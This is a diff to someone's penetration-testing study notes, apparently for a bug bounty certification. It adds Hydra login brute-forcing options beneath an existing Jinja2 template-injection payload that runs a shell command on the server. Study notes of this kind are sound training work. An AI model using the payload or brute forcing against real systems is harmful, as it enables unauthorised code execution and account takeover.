@@ -166,5 +166,13 @@ Stuff for CBBH
 
     #Jinja1 RCE
     {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+  LOGIN BRUTE FORCING
+
+    #Some hydra notes
+    -u : by default Hydra checks all passwords for one login and then tries the next login. This option loops around the passwords, so the first password is tried on all logins,  then
+         the next password.
+    -f : exit after the first found login/password pair
+
     
     
